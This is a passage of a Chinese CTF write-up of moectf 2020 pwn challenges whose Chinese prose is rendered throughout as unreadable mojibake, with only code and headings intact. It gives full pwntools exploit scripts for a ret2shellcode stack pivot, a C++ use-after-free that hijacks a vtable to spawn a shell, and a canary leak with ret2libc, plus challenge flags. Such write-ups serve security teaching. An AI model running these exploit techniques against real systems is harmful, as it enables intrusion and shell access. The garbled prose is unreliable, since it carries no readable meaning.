ˆåŸæœ¬æ‰€åˆ†é…çš„ç©ºé—´çš„å¤§å°ï¼Œè¿˜è¦ç®—ä¸Š<code>ebp/rbp</code>å¯„å­˜å™¨æ‰€å ç”¨çš„4&#x2F;8ä¸ªå­—èŠ‚ï¼Œä¹‹åæ‰åˆ°å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ä¸€ä¸ªå‡½æ•°å¯åŠ¨æ—¶ï¼Œä¼šå…ˆå°†ebp&#x2F;rbpçš„å€¼å‹å…¥æ ˆä¸­ï¼Œä¹‹åå°†æŒ‡å‘æ ˆé¡¶çš„esp&#x2F;rspå¯„å­˜å™¨çš„å€¼èµ‹ç»™ebp&#x2F;rbpå¯„å­˜å™¨ï¼Œéšåé€šè¿‡ebp&#x2F;rbpå¯„å­˜å™¨æ¥å®ç°å¯¹æ ˆçš„è®¿é—®</p><p><img src="https://i.loli.net/2020/08/24/U8f5Y1CJrsdVT69.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/24/jQkcHxb5MgARspU.png" alt="image.png"></p><p>åŒæ ·çš„ï¼Œæœ‰å‹æ ˆåŒæ ·å°±ä¼šæœ‰å‡ºæ ˆæ¥æ¢å¤ebp&#x2F;rbpä¸esp&#x2F;rspçš„å€¼ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“åœ¨å‡½æ•°è¿è¡Œåˆ°æœ«å°¾æ—¶ï¼Œä¼šæ‰§è¡Œ<code>leave</code>ï¼Œ<code>retn</code>ä¸¤æ¡æŒ‡ä»¤</p><p><img src="https://i.loli.net/2020/08/24/v79Elx15bWXdyoZ.png" alt="image.png"></p><p>å…¶ä¸­<code>leave</code>æŒ‡ä»¤ä¾¿æ˜¯ç”¨æ¥æ¢å¤æ ˆå¸§çš„æŒ‡ä»¤ï¼Œå®ƒç­‰ä»·äºå¦‚ä¸‹æŒ‡ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">;ebp &amp; esp in 32-bit</span><br><span class="line">mov rsp, rbp</span><br><span class="line">pop rbp</span><br></pre></td></tr></table></figure><p>ç”±äº<strong>å¯¹æ ˆçš„è®¿é—®éƒ½æ˜¯é€šè¿‡ebp&#x2F;rbpè¿›è¡Œçš„</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œåªè¦æˆ‘ä»¬åœ¨æº¢å‡ºæ—¶<strong>è¦†å†™æ‰æ ˆå†…å‚¨å­˜çš„åŸebp&#x2F;rbpçš„å€¼</strong>ï¼Œ<strong>åœ¨retnæŒ‡ä»¤è¿”å›åç¨‹åºæ‰€åˆ¤å®šçš„æ ˆåŸºå€å…¶å®å°±å˜æˆäº†æˆ‘ä»¬æ‰€è¦†å†™ä¸Šçš„é‚£ä¸ªåœ°å€</strong>ï¼Œä¹‹åç¨‹åºåœ¨è°ƒç”¨æ ˆä¸Šçš„å˜é‡çš„æ—¶å€™å…¶å®éƒ½æ˜¯åŸºäºæˆ‘ä»¬æ‰€è¦†å†™ä¸Šçš„æ–°çš„æ ˆåŸºå€è¿›è¡Œæ“ä½œçš„äº†ï¼Œç›¸å½“äºæŠŠæ ˆåŠ«æŒåˆ°å¦ä¸€ä¸ªåœ°æ–¹ï¼Œæ‰€ä»¥åˆå«<strong>æ ˆåŠ«æŒ</strong></p></blockquote><h2 id="Hard-shellcode-ret2shellcode"><a href="#Hard-shellcode-ret2shellcode" class="headerlink" title="Hard shellcode - ret2shellcode"></a>Hard shellcode - ret2shellcode</h2><p> <a href="/download/moectf2020/pwn/hard_shellcode/hard_shellcode%22%E7%82%B9%E5%87%BB%E6%AD%A4%E5%A4%84%E4%B8%8B%E8%BD%BD%E5%8E%9F%E9%A2%98%22">ç‚¹å‡»ä¸‹è½½-hard_shellcode</a> </p><p>é¦–å…ˆæ˜¯æƒ¯ä¾‹çš„<code>checksec</code></p><p><img src="https://i.loli.net/2020/08/09/hkzgUZj8rYPoFI3.png" alt="image.png"></p><p>ä¿æŠ¤å…¨å…³ï¼Œä¼¼ä¹æ•´æŒºå¥½</p><p>ä¸è¿‡è¿™é¢˜çš„åˆ†å€¼æ¯”rop2è¿˜è¦é«˜100åˆ†ï¼Œå°å¿ƒä¸ºå¦™XD</p><p>æ‹–å…¥IDAçœ‹çœ‹</p><p><img src="https://i.loli.net/2020/08/09/GdmDsjEnXpBqobO.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè¯»å…¥0x50ä¸ªå­—èŠ‚ï¼Œbufå¤§å°ä¸º0x40ï¼Œ<strong>å­˜åœ¨æ ˆæº¢å‡º</strong></p><p><strong>ä½†æ˜¯æº¢å‡ºå¤§å°åªæœ‰0x10ä¸ªå­—èŠ‚ï¼Œç”šè‡³æ— æ³•æ”¾ä¸‹ä¸€æ®µå®Œæ•´çš„èƒ½ç”¨ä»¥getshellçš„shellcodeï¼Œç®—ä¸Šè¦†ç›–æ‰RBPçš„å…«ä¸ªå­—èŠ‚ï¼Œè¿”å›åœ°å€çš„å…«ä¸ªå­—èŠ‚åï¼Œæˆ‘ä»¬ä¸€æ— æ‰€æœ‰XD</strong></p><p>è¿˜æ˜¯çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„gadgetå§XD</p><p>æˆ‘ä»¬ä¸éš¾æ‰¾åˆ°åœ¨IDAä¸­ç›´æ¥æœ‰ä¸€æ®µä»£ç æ ‡æ³¨ç€<code>_gadget</code>ï¼Œçœ‹å¾—å‡ºæ¥è¿™æ®µä»£ç å¾ˆæƒ³è¢«æˆ‘ä»¬åˆ©ç”¨wwwï¼ˆ</p><p><img src="https://i.loli.net/2020/08/09/FidYB2N85WspeDt.png" alt="image.png"></p><blockquote><p>æ³¨ï¼šæ‰¾å¯»å¯åˆ©ç”¨çš„gadgetä¹Ÿå¯ä»¥ç”¨å·¥å…·ROPgadgetï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary hard_shellcode --ropchain</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2020/08/09/zw9PxaDdpCf4h5B.png" alt="image.png" style="zoom: 50%;" /></blockquote><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°ï¼Œå½“æˆ‘ä»¬è¾“å…¥å®Œ0x50ä¸ªå­—èŠ‚æ—¶ï¼Œç¨‹åºè¿è¡Œåˆ°è¿”å›åœ°å€è¿”å›åˆ°æŸä¸ªä»£ç æ®µåï¼ŒrspæŒ‡å‘è¿”å›åœ°å€çš„é«˜ä¸€ä¸ªå­—èŠ‚</p><p>è‹¥æ˜¯è¿”å›è‡³gadgetï¼š0x4000eaï¼š</p><p>æ‰§è¡Œpush rbpåï¼Œ<strong>rsp &#x3D; åŸrsp - 8</strong></p><p>æ‰§è¡Œmov rbp, rsp; sub rsp, 8åï¼Œ <strong>rsp &#x3D; åŸrsp-16</strong></p><p>æ‰§è¡Œjmp rspå<strong>ç¨‹åºä¼šå°è¯•æ‰§è¡Œrspä¸Šçš„ä»£ç ï¼Œå³åŸrsp-16ä½ç½®ä¸Šçš„ä»£ç </strong></p><p>è¿™ä¸ªä½ç½®ä¾¿æ˜¯æˆ‘ä»¬<strong>è¾“å…¥æ—¶æ‰€è¦†ç›–æ‰çš„RBPçš„ä½ç½®</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬åœ¨è¿™ä¸ªä½ç½®ä¸Š<strong>ä¾¿æœ‰8ä¸ªå­—èŠ‚çš„ç©ºé—´å¯ä»¥å†™ä¸Šæˆ‘ä»¬çš„shellcode</strong></p><p>åŒæ—¶æˆ‘ä»¬æƒ³åˆ°ï¼Œ<strong>å‰é¢è¿˜æœ‰64ä¸ªå­—èŠ‚çš„ç©ºé—´ï¼Œå®Œå…¨å¯ä»¥è£…å¾—ä¸‹ä¸€æ®µgetshellçš„shellcode</strong></p><p>æˆ‘ä»¬åªéœ€è¦å…ˆåœ¨å‰é¢å†™ä¸Šgetshellï¼Œ<strong>å†åœ¨8ä¸ªå­—èŠ‚çš„ç©ºé—´ä¸­å†™å…¥ä¿®æ”¹rspçš„å€¼å¹¶å†æ¬¡è·³è½¬è‡³rspå³å¯getshellï¼ˆrspä¸æˆ‘ä»¬çš„è¾“å…¥çš„åç§»é‡æ˜¯å¯çŸ¥çš„ï¼‰</strong></p><p>æ•…å¾—expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">sc = asm(shellcraft.sh())</span><br><span class="line">sub_rsp = asm(<span class="string">&#x27;sub rsp, 64&#x27;</span>)</span><br><span class="line">jmp_rsp = asm(<span class="string">&#x27;jmp rsp&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gadget_addr = p64(<span class="number">0x4000ea</span>)</span><br><span class="line"></span><br><span class="line">payload = sc + <span class="string">b&#x27;A&#x27;</span>*(<span class="number">64</span>-<span class="built_in">len</span>(sc)) + sub_rsp + jmp_rsp + <span class="string">b&#x27;A&#x27;</span>*(<span class="number">8</span>-<span class="built_in">len</span>(sub_rsp)-<span class="built_in">len</span>(jmp_rsp)) + gadget_addr</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;hard_shellcode&#x27;</span>)<span class="comment">#p = remote(&#x27;sec.eqqie.cn&#x27;,10002)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å‘æœåŠ¡å™¨å‘é€payloadï¼ŒæˆåŠŸgetsgell</p><p><img src="https://i.loli.net/2020/08/09/QwGlAhc5fd9rItp.png" alt="image.png"></p><p>å¾—åˆ°flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Ni_HA0_q1ang_a!&#125;</span><br></pre></td></tr></table></figure><h2 id="easycppï¼ˆå·²ä¸‹çº¿ï¼‰-Use-After-Free"><a href="#easycppï¼ˆå·²ä¸‹çº¿ï¼‰-Use-After-Free" class="headerlink" title="easycppï¼ˆå·²ä¸‹çº¿ï¼‰ - Use After Free"></a>easycppï¼ˆå·²ä¸‹çº¿ï¼‰ - Use After Free</h2><blockquote><p>æ³¨ï¼šæœ¬é¢˜å› ä¸ºä¸€äº›åŸå› åœ¨æ¯”èµ›è¿‡ç¨‹ä¸­ä¸‹çº¿äº†</p></blockquote><p> <a href="/download/minil/pwn/easycpp%22%E7%82%B9%E5%87%BB%E6%AD%A4%E5%A4%84%E4%B8%8B%E8%BD%BD%E5%8E%9F%E9%A2%98%22">ç‚¹å‡»ä¸‹è½½-easycpp</a><br> <a href="/download/minil/pwn/libc.so.6%22%E7%82%B9%E5%87%BB%E6%AD%A4%E5%A4%84%E4%B8%8B%E8%BD%BD%E5%8E%9F%E9%A2%98%22">ç‚¹å‡»ä¸‹è½½-libc.so.6</a> </p><p>é¦–å…ˆæ˜¯æƒ¯ä¾‹çš„<code>checksec</code></p><p><img src="https://i.loli.net/2020/08/09/tpZQ1nE5oaGdsRX.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå’Œå‰é¢å‡ é¢˜ä¸åŒçš„æ˜¯è¿™ä¸ªç¨‹åºæ˜¯ä¸€ä¸ª32ä½çš„ç¨‹åº</p><p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png" alt="image.png"></p><p>ç”¨åˆ°äº†ä¸€ä¸ªåä¸º<code>B</code>çš„ç±»ï¼Œæˆ‘ä»¬å…ˆçœ‹çœ‹è¿™ä¸ªç±»éƒ½æœ‰äº›å•¥</p><p>IDAä¸­ç±»Bæœ‰ä¸€ä¸ªæ„é€ å‡½æ•°<code>B()</code>å’Œä¸€ä¸ª<code>print()</code>å‡½æ•°</p><p><img src="https://i.loli.net/2020/08/09/oIvaelmuFLr24JY.png" alt="image.png"></p><p>ç±»Bçš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼š</p><p><img src="https://i.loli.net/2020/08/09/s1t4V8f7k9JvLQT.png" alt="image.png"></p><p>ç±»Bçš„æ„é€ å‡½æ•°é¦–å…ˆè°ƒç”¨äº†ç±»Açš„æ„é€ å‡½æ•°ï¼Œç„¶åå°†å˜é‡_vptr_Aè®¾ç½®ä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</p><p>æˆ‘ä»¬ä¸éš¾çœ‹åˆ°åœ¨0x80489E4ä½ç½®ä¸Šæˆ‘ä»¬è¿˜éœ€è¦å†è·³è½¬ä¸€æ¬¡åˆ°0x80488F2çš„ä½ç½®ï¼Œè¿™ä¸ªä½ç½®ä¸Šæœ‰ä¸€ä¸ª<code>B::print()</code>å‡½æ•°ï¼Œæ•…å¯çŸ¥è¿™æ˜¯ä¸€ä¸ª<strong>äºŒçº§å‡½æ•°æŒ‡é’ˆ</strong></p><p><img src="https://i.loli.net/2020/08/09/k7gyPQfNmvLeJCn.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/09/7ILSlb95q12Dfny.png" alt="image.png"></p><p>æˆ‘ä»¬å†æ¥çœ‹çœ‹ç±»Açš„æ„é€ å‡½æ•°ï¼Œå¦‚ä¸‹ï¼š</p><img src="https://i.loli.net/2020/08/09/thgBiFQcLl86mru.png" alt="image.png" style="zoom:50%;" /><p>ç±»Açš„æ„é€ å‡½æ•°ä¹Ÿæ˜¯å°†å˜é‡<code>_vptr_A</code>è®¾ç½®ä¸ºä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ</p><p>ä½äºoff_80489F0ä¸Šçš„å‡½æ•°ä¸º<code>A::print()</code></p><p><img src="https://i.loli.net/2020/08/09/5qF6acIEWUGOvZ7.png" alt="image.png"></p><p><img src="https://i.loli.net/2020/08/09/NDidotkIqXPuHn7.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æ˜¯mainå‡½æ•°çš„ç®€å•åˆ†æï¼š</p><p><img src="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png" alt="image.png"></p><p>v3ã€v4éƒ½æ˜¯ä¸€ä¸ªç±»å‹ä¸º<code>ç±» B</code>çš„æŒ‡é’ˆ</p><p>é¦–å…ˆ<code>setvbuf()</code>å‡½æ•°å°†ç¨‹åºè®¾ç½®ä¸ºæ— ç¼“å†²è¾“å…¥</p><p>ä¹‹ååˆ›å»ºäº†ä¸€ä¸ªç±»Bçš„å®ä¾‹å¹¶å°†åœ°å€ç»™åˆ°æŒ‡é’ˆv3å’Œv4</p><p>ä¹‹åå°†è¯¥å®ä¾‹å†…çš„å˜é‡<code>_vptr_A</code>çš„å€¼è®¾ä¸º0</p><p>ä¹‹åä½¿ç”¨deleteé‡Šæ”¾æ‰ä¹‹å‰åˆ†é…ç»™v3ã€v4çš„å†…å­˜</p><p>ä¹‹å<strong>ä»æ ‡å‡†è¾“å…¥æµè¯»å…¥1024ä¸ªå­—èŠ‚åˆ°buf</strong>ï¼ˆæˆ–è®¸æœ‰æ“ä½œç©ºé—´ï¼Ÿï¼‰</p><p>ä¹‹åè°ƒç”¨<code>strbuf()</code>å‡½æ•°é‡æ–°åˆ†é…ä¸€æ®µå†…å­˜ç©ºé—´å¹¶å°†bufçš„å€¼æ‹·è´ä¸€ä»½ï¼ˆå½“ç„¶æœ€åå¹¶æ²¡æœ‰æŒ‡é’ˆæ¥æ”¶è¿™ä¸€å—å†…å­˜ï¼Œé‚£ä¹ˆå®ƒä¼šæˆä¸ºé‡å†…å­˜å—ï¼Ÿï¼‰</p><p>æœ€å<strong>é‡æ–°è°ƒç”¨v4çš„å‡½æ•°æŒ‡é’ˆå˜é‡æ‰€æŒ‡å‘çš„å‡½æ•°</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬åœ¨è¿™é‡Œå°±å¯ä»¥å‘ç°ä¸€ä¸ªæ¼æ´ï¼š</p><p>v3ã€v4æ‰€æŒ‡å‘çš„å†…å­˜ç©ºé—´è¢«é‡Šæ”¾åv3ã€v4å¹¶æ²¡æœ‰è¢«è®¾ç½®ä¸ºNULLï¼Œåœ¨è¿è¡Œåˆ°strdup()å‡½æ•°æ—¶è‹¥æ˜¯æˆ‘ä»¬ç»™åˆ°bufçš„è¾“å…¥é•¿åº¦åœ¨ä¸€å®šèŒƒå›´å†…ï¼Œè¿™ä¸€å—å†…å­˜ç©ºé—´ä¼šè¢«å †ç®¡ç†å™¨é‡æ–°åˆ†é…ç»™strdup()å‡½æ•°ï¼Œè€Œä¹‹ååˆé€šè¿‡v4å†æ¬¡å¯¹è¿™ä¸€å—å†…å­˜ç©ºé—´è¿›è¡Œè°ƒç”¨ï¼Œå¾ˆæ˜æ˜¾å­˜åœ¨<strong>UAFï¼ˆUse After Freeï¼‰</strong>æ¼æ´</p><p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°å­˜åœ¨ä¸€ä¸ª<code>backdoor()</code>å‡½æ•°ç›´æ¥è°ƒç”¨äº†<code>system(&quot;/bin/sh&quot;)</code>ï¼Œå¯ä»¥ç›´æ¥getshell</p><p><img src="https://i.loli.net/2020/08/09/dPJUXZ6M9kx8RnN.png" alt="image.png"></p><p>æ•…æˆ‘ä»¬åªéœ€è¦è¦†å†™æ‰å‡½æ•°æŒ‡é’ˆæ‰€æŒ‡çš„å‡½æ•°ä¸ºbackdoor()å‡½æ•°å³å¯getshell</p><p>æ„é€ äºŒçº§æŒ‡é’ˆçš„ç»“æ„åº”ä¸º</p><table><thead><tr><th>buf</th><th>buf+4</th></tr></thead><tbody><tr><td>å³è¾¹é‚£ä¸€å—çš„åœ°å€ -&gt;</td><td>æŒ‡å‘backdoorå‡½æ•°çš„åœ°å€</td></tr></tbody></table><p>bufçš„åœ°å€å¦‚ä¸‹ï¼š</p><img src="https://img-blog.csdnimg.cn/20200809084003820.png" alt="image.png" style="zoom:50%;" /><p>æ•…å¾—expå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;easycpp&#x27;</span>)<span class="comment">#p = remote(&#x27;sec.eqqie.cn&#x27;, 10007)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x80487BB</span></span><br><span class="line">buf = <span class="number">0x804A0C0</span></span><br><span class="line"></span><br><span class="line">payload = p32(buf + <span class="number">4</span>) + p32(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘æœåŠ¡å™¨å‘é€payloadï¼ŒæˆåŠŸgetsgell</p><img src="https://i.loli.net/2020/08/09/eWifdr1K3v8Vxka.png" alt="image.png" style="zoom: 33%;" /><img src="https://i.loli.net/2020/08/09/6nQtRSwIdhX5peB.png" alt="image.png" style="zoom:50%;" /><p>å¾—åˆ°flag:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;Ev3ryth1ng_c@n_be_cPP!&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/">ctf-wikf:Use After Free</a></p></blockquote><h2 id="baby-canary-canary-partial-overwrite-ret2libc"><a href="#baby-canary-canary-partial-overwrite-ret2libc" class="headerlink" title="baby canary - canary + partial overwrite + ret2libc"></a>baby canary - canary + partial overwrite + ret2libc</h2><p> [ç‚¹å‡»ä¸‹è½½-baby_canary](&#x2F;download&#x2F;moectf2020&#x2F;pwn&#x2F;baby canary&#x2F;baby_canaryâ€ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜â€) </p><p> [ç‚¹å‡»ä¸‹è½½-libc.so.6](&#x2F;download&#x2F;moectf2020&#x2F;pwn&#x2F;baby canary&#x2F;libc.so.6â€ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜â€) </p><p>é¦–å…ˆæ˜¯æƒ¯ä¾‹çš„<code>checksec</code></p><p><img src="https://i.loli.net/2020/08/29/wtnmcLYru4OTdgs.png" alt="image.png"></p><p>é™¤äº†åœ°å€éšæœºåŒ–ä»¥å¤–éƒ½å¼€äº†ï¼Œ<strong>è¿™ä¹Ÿæ˜¯å”¯ä¸€ä¸€é“éœ€è¦æˆ‘ä»¬ç»•è¿‡canaryä¿æŠ¤çš„é¢˜</strong></p><p>å½“ç„¶ï¼Œçœ‹åå­—æˆ‘ä»¬å°±çŸ¥é“è¿™é¢˜è‚¯å®šè¦è€ƒcanaryï¼ˆ</p><p>é¦–å…ˆæ‹–å…¥IDAè¿›è¡Œåˆ†æ</p><p><img src="https://i.loli.net/2020/08/29/lAEmSNwFPbVyfop.png" alt="image.png"></p><p>å”¯ä¸€çš„ä¸€ä¸ªå¯å¡‘çš„è¾“å‡ºç‚¹æ˜¯printfï¼Œæˆ‘ä»¬è€ƒè™‘æ„é€ é•¿åº¦ä¸º<code>0x4c-0xc+1</code>çš„padding<strong>è¦†å†™æ‰canaryçš„æœ€é«˜ä½å­—èŠ‚\x00ï¼Œè¿™æ ·ç¨‹åºåœ¨è°ƒç”¨printfå‡½æ•°æ—¶ä¾¿ä¼šè¾“å‡ºcanaryçš„å€¼</strong></p><p>ä¹Ÿå°±æ˜¯<strong>partial overwrite</strong></p><p>é‚£ä¹ˆæˆ‘ä»¬çš„ç¬¬ä¸€æ¡payloadå°±å‡ºæ¥äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x4c</span>-<span class="number">0xc</span>+<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>ä¹‹åç¨‹åºåœ¨è¾“å‡ºå®Œæˆ‘ä»¬çš„è¾“å…¥ä¹‹åè¿˜ä¼šå†è¾“å‡ºä¸€äº›ä¸œè¥¿ï¼Œè€Œå…¶ä¸­çš„å‰ä¸‰ä¸ªå­—èŠ‚ä¾¿æ˜¯<strong>canaryçš„ä½ä¸‰ä½å­—èŠ‚</strong></p><p>æ•…æˆ‘ä»¬è€ƒè™‘ä½¿ç”¨ä»¥ä¸‹ä»£ç å¾—åˆ°canaryï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u32(<span class="string">&#x27;\x00&#x27;</span>+p.recv(<span class="number">3</span>))</span><br></pre></td></tr></table></figure><p>å¾—åˆ°äº†canaryçš„å€¼ä¹‹åæˆ‘ä»¬å°±å¯ä»¥å°½æƒ…åœ°æº¢å‡ºäº†</p><p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°ä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„systemå‡½æ•°æˆ–æ˜¯&#x2F;bin&#x2F;shå­—ç¬¦ä¸²</p><p><img src="https://i.loli.net/2020/08/29/ZN8SXe5KECDAnJI.png" alt="image.png"></p><p>é¢˜ç›®ç»™å‡ºäº†<code>libc.so.6</code>æ–‡ä»¶ï¼Œæ•…è€ƒè™‘<strong>ret2libc</strong>ï¼Œæ„é€ ropé“¾å…ˆå°†å‡½æ•°è¿”å›è‡³<code>puts</code>ï¼Œè¾“å‡ºputså‡½æ•°çš„çœŸå®åœ°å€ï¼ˆå‚¨å­˜åœ¨gotè¡¨ä¸­ï¼‰ï¼Œä¹‹åè®¡ç®—å‡ºlibcçš„åŸºå€ï¼Œå†è®¡ç®—å‡ºlibcä¸­systemå‡½æ•°ä¸&#x2F;bin&#x2F;shå­—ç¬¦ä¸²çš„çœŸå®åœ°å€ï¼Œæœ€åæ„é€ ropé“¾æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯getshell</p><p>æ•…æœ€ç»ˆæ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;sec.arttnba3.cn&#x27;</span>,<span class="number">10003</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./baby_canary&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">payload1 = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x4c</span>-<span class="number">0xc</span>+<span class="number">1</span>)</span><br><span class="line">p.send(payload1)</span><br><span class="line">p.recvuntil(payload1)</span><br><span class="line">canary = u32(<span class="string">b&#x27;\x00&#x27;</span>+p.recv(<span class="number">3</span>))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x4c</span>-<span class="number">0xc</span>) + p32(canary) + <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0xc</span>-<span class="number">4</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(puts_plt)+ p32(e.sym[<span class="string">&#x27;main&#x27;</span>]) + p32(puts_got)</span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;flag!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = p.recv(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(puts_addr)</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh_addr = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">payload3 = <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x4c</span>-<span class="number">0xc</span>) + p32(canary) + <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0xc</span>-<span class="number">4</span>) + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line">p.send(payload3)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>è¿è¡Œexpï¼ŒæˆåŠŸgetshell</p><p><img src="https://i.loli.net/2020/08/29/v7Kau1Bop9rckdU.png" alt="image.png"></p><p>å¾—åˆ°flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;W0w_Y0u_c@n_e5cap3_fr0m_c4nary!&#125;</span><br></pre></td></tr></table></figure><h1 id="0x02-Misc"><a href="#0x02-Misc" class="headerlink" title="0x02.Misc"></a>0x02.Misc</h1><h2 id="ç®€-å•-çš„ç¤¾å·¥é¢˜"><a href="#ç®€-å•-çš„ç¤¾å·¥é¢˜" class="headerlink" title="ç®€ å• çš„ç¤¾å·¥é¢˜"></a>ç®€ å• 